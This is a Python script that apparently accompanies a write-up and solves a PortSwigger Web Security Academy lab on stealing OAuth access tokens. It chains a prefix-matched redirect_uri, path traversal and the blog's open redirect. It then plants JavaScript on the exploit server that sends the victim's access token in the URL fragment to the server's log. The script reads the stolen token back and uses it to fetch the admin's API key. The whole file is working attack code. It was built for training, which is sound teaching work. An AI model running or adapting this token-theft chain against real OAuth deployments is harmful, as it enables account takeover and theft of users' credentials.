#!/usr/bin/env python3
"""
Stealing OAuth access tokens via an open redirect
PortSwigger Web Security Academy -- OAuth authentication

Companion script for the writeup: 04-stealing-oauth-access-tokens-via-an-open-redirect.md

What this does:
    The OAuth provider whitelists redirect_uri by prefix match, so appending
    "/../post/next?path=..." onto the legitimate callback is accepted -- the
    browser resolves the traversal client-side to the blog's own open redirect
    at /post/next?path=, which forwards to an arbitrary absolute URL. Because
    this lab uses the implicit grant, the access token rides in the URL fragment,
    which survives both the traversal and the open redirect hop. The script finds
    the open redirect, builds the chained redirect_uri, and deploys a two-phase
    JS page on the exploit server: phase 1 (no fragment yet) sends the victim into
    the crafted authorization URL; phase 2 (fragment present, meaning the whole
    chain completed and landed back on this same page) forwards the fragment to
    the exploit server's own /log endpoint as a query string, where it becomes
    readable in the access log. The script reads the token back out of that log,
    calls the OAuth provider's /me endpoint with it, and submits the recovered
    API key.

Usage:
    python 04-stealing-oauth-access-tokens-via-an-open-redirect.py <lab-url>
    e.g. python 04-stealing-oauth-access-tokens-via-an-open-redirect.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import urllib.parse
import httpx


def solve(lab_url: str) -> None:
    c = httpx.Client(verify=False, follow_redirects=True, timeout=15)

    home = c.get(lab_url)
    exploit_m = re.search(r'(https://exploit-[^/]+\.exploit-server\.net)', home.text)
    if not exploit_m:
        print("[-] No exploit server found on the lab homepage.")
        return
    exploit_server = exploit_m.group(1)
    print(f"[*] Exploit server: {exploit_server}")

    # Step 1: discover the OAuth flow (some lab instances meta-refresh instead
    # of issuing a 302 from /social-login).
    print("[*] Discovering OAuth flow...")
    r = c.get(f"{lab_url}/social-login", follow_redirects=False)
    location = r.headers.get("location", "")
    if not location and r.status_code == 200:
        meta = re.search(r'url=([^\'">\s]+)', r.text)
        if meta:
            location = meta.group(1)

    if not location:
        print("[-] Could not find the OAuth redirect URL.")
        return

    parsed = urllib.parse.urlparse(location)
    params = urllib.parse.parse_qs(parsed.query)
    oauth_origin = f"{parsed.scheme}://{parsed.netloc}"
    auth_path = parsed.path
    client_id = params.get("client_id", [""])[0]
    original_redirect = params.get("redirect_uri", [""])[0]

    print(f"[*] OAuth provider: {oauth_origin}")
    print(f"[*] Client ID: {client_id}")
    print(f"[*] Redirect URI: {original_redirect}")

    # Step 2: confirm the open redirect exists on a blog post.
    print("[*] Looking for open redirect on blog posts...")
    posts = re.findall(r'href="(/post\?postId=\d+)"', home.text)
    open_redirect_found = False
    for post_path in posts[:3]:
        post_page = c.get(f"{lab_url}{post_path}")
        next_post = re.search(r'href="(/post/next\?path=[^"]*)"', post_page.text)
        if next_post:
            open_redirect_found = True
            print("[+] Open redirect found: /post/next?path=")
            break

    if not open_redirect_found:
        print("[-] No open redirect found on blog posts.")
        return

    # Step 3: build the chained redirect_uri -- traversal onto the open redirect,
    # which forwards on to our exploit server.
    traversal_redirect = (
        f"{original_redirect}/../post/next?path="
        f"{exploit_server}/exploit"
    )

    auth_url = (
        f"{oauth_origin}{auth_path}"
        f"?client_id={client_id}"
        f"&redirect_uri={urllib.parse.quote(traversal_redirect, safe='')}"
        f"&response_type=token"
        f"&nonce=1"
        f"&scope=openid%20profile%20email"
    )

    # Step 4: deploy the two-phase JS exploit. Phase 1 (no hash) kicks off the
    # crafted OAuth redirect; phase 2 (hash present, meaning the chain completed
    # and looped back to this same page) forwards the fragment to /log.
    exploit_body = (
        "<script>\n"
        "if (!document.location.hash) {\n"
        f'    window.location = "{auth_url}";\n'
        "} else {\n"
        f'    window.location = "{exploit_server}/log?" + document.location.hash.substr(1);\n'
        "}\n"
        "</script>"
    )

    print("[*] Deploying token theft exploit...")
    c.post(
        f"{exploit_server}/",
        data={
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html",
            "responseBody": exploit_body,
            "formAction": "STORE",
        },
    )

    c.get(f"{exploit_server}/deliver-to-victim")
    print("[*] Exploit delivered, waiting for token...")
    time.sleep(5)

    # Step 5: pull the token out of the access log.
    log = c.get(f"{exploit_server}/log").text
    tokens = re.findall(r'access_token=([A-Za-z0-9_-]+)', log)
    if not tokens:
        time.sleep(5)
        log = c.get(f"{exploit_server}/log").text
        tokens = re.findall(r'access_token=([A-Za-z0-9_-]+)', log)

    if not tokens:
        print("[-] No access token captured from admin.")
        return

    stolen_token = tokens[-1]
    print(f"[+] Stolen access token: {stolen_token[:30]}...")

    # Step 6: use the token at /me on the OAuth provider to get the admin's API key.
    r = c.get(f"{oauth_origin}/me", headers={"Authorization": f"Bearer {stolen_token}"})
    if r.status_code != 200:
        r = c.get(f"{oauth_origin}/userinfo", headers={"Authorization": f"Bearer {stolen_token}"})
    print(f"[+] User info: {r.text[:200]}")

    api_key_match = re.search(r'"apikey"\s*:\s*"([^"]+)"', r.text)
    if api_key_match:
        api_key = api_key_match.group(1)
        print(f"[+] Admin API key: {api_key}")
        c.post(f"{lab_url}/submitSolution", data={"answer": api_key})

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
